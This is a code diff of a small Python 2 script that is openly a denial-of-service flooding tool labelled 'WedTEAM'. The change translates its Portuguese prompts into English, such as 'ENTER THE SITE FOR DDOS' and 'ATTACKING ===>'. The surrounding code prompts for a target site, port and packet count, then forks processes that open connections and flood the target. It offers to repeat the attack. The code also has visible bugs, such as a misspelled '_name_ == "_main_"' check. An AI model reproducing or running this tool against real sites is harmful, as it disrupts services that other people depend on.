@@ -28,14 +28,14 @@ def restart_program():
 curdir = os.getcwd()
 message = "WedTEAM"
 print (" ")
-host=raw_input( "DIGITE O SITE PARA DDoS :" )
+host=raw_input( "ENTER THE SITE FOR DDOS :" )
 print (" ")
-port=input( "DIGITE A PORTA PARA O ATAQUE :" )
+port=input( "ENTER THE DOOR FOR THE ATTACK :" )
 print (" ")
-conn=input( "QUANTOS PACKETS DESEJA ENVIAR ? :" )
+conn=input( "HOW MANY PACKETS DO YOU WANT TO SEND ? :" )
 ip = socket.gethostbyname( host )
 print ("[" + ip + "]")
-print ( "[ATACANDO ===> " + host + "]" )
+print ( "[ATTACKING ===> " + host + "]" )
 def dos():
     pid = os.fork()
     ddos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -45,14 +45,14 @@ def dos():
         ddos.sendto( message, (ip, port) )
         ddos.send( message );
     except socket.error, msg:
-        print("|[SEM CONEXAO|")
+        print("|[NO CONNECTION|")
     print ( "@===]=====> DDoS <=====[===@")
     ddos.close()
 for i in range(1, conn):
     dos()
-print("CONCLUIDO")
+print("CONCLUDED")
 if _name_ == "_main_":
-    answer = raw_input("QUER MAIS DDoS ? :")
+    answer = raw_input("WANT MORE DDoS ? :")
     if answer.strip() in "y Y yes Yes YES".split():
         restart_program()
     else:
